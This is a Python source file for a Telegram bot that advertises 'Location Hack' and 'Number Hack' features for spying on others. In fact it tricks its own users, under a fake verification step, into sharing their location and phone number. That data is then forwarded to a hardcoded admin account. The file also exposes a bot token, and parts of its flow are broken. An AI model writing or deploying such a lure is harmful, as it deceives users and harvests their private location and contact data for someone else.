import telebot
from telebot import types

BOT_TOKEN = '7405631437:AAGz6S5JJsZSECM9-Q6L7h4OG5gv0Z1vocs'
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_ID = 7401896933  # Admin ID for notifications
CHANNEL_ID = -1002316557460  # Private Channel Chat ID for Force Join
BOT_USERNAME = "USEFULXBOT"  # Replace with your bot's username

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id

    # Check if user has joined the channel
    if not is_user_in_channel(message.chat.id):
        force_join_channel(message)
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('📍 Location Hack', '📱 Number Hack')

        bot.send_message(
            message.chat.id,
            "Welcome to USEFULXBOT!\nChoose 'Location Hack' or 'Number Hack' to hack the location or phone number. Please verify it first.",
            reply_markup=markup
        )

# Check if user has joined the channel
def is_user_in_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_ID, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Force Join Channel
def force_join_channel(message):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/+g-i8Vohdrv44NDRl")
    markup.add(join_button)

    bot.send_message(
        message.chat.id,
        "You must join our channel to proceed.\nClick the button below to join:",
        reply_markup=markup
    )

# Button Handler for Location Hack and Number Hack
@bot.message_handler(func=lambda message: True)
def button_handler(message):
    if message.text == '📍 Location Hack':
        send_verify_button(message, "Location")

    elif message.text == '📱 Number Hack':
        send_verify_button(message, "Number")

    elif message.content_type == 'location':
        send_location_and_number_to_owner(message, "Location")

    elif message.content_type == 'contact':
        send_location_and_number_to_owner(message, "Number")
    else:
        bot.reply_to(message, "Please use the provided buttons or send a valid location or number.")

# Send Verification Button for Location Hack and Number Hack
def send_verify_button(message, hack_type):
    user_id = message.from_user.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    verify_button = types.KeyboardButton("✅ Verify and Share")

    bot.send_message(
        message.chat.id,
        f"To proceed with {hack_type} Hack, please click 'Verify and Share'. Once you click it, you'll need to send your {hack_type}.",
        reply_markup=markup
    )
    
    markup.add(verify_button)

# Handle Location and Number Verification
@bot.message_handler(func=lambda message: message.text == '✅ Verify and Share')
def handle_verification(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    if message.text == '📍 Location Hack':
        location_button = types.KeyboardButton("📍 Share Location", request_location=True)
        markup.add(location_button)
        bot.send_message(
            message.chat.id,
            "Please share your location to proceed with the hack.",
            reply_markup=markup
        )
    
    elif message.text == '📱 Number Hack':
        contact_button = types.KeyboardButton("📱 Share Phone Number", request_contact=True)
        markup.add(contact_button)
        bot.send_message(
            message.chat.id,
            "Please share your phone number to proceed with the hack.",
            reply_markup=markup
        )

# Receive Location and Number, Send to Admin
def send_location_and_number_to_owner(message, hack_type):
    user_id = message.from_user.id

    if hack_type == "Location":
        latitude = message.location.latitude
        longitude = message.location.longitude
        location_link = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"

        # Send location data to the admin
        bot.send_message(
            ADMIN_ID,
            f"📍 New Location Captured:\nUser ID: {user_id}\nLatitude: {latitude}\nLongitude: {longitude}\n[View on Map]({location_link})"
        )

        # Send location confirmation to the user
        bot.send_message(
            message.chat.id,
            "✅ Location successfully captured and verified!"
        )

    elif hack_type == "Number":
        phone_number = message.contact.phone_number

        # Send phone number to the admin
        bot.send_message(
            ADMIN_ID,
            f"📱 New Phone Number Captured:\nUser ID: {user_id}\nPhone Number: {phone_number}"
        )

        # Send phone number confirmation to the user
        bot.send_message(
            message.chat.id,
            "✅ Phone number successfully captured and verified!"
        )

# Admin Panel Command
@bot.message_handler(commands=['adminpanel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "You are not authorized to view this panel.")
        return

    # Display new users and their data
    bot.send_message(
        ADMIN_ID, 
        f"**Admin Panel**\nThe bot is running fine and collecting location and number data as expected. Admin can view it here."
    )

# Bot Polling
bot.infinity_polling()
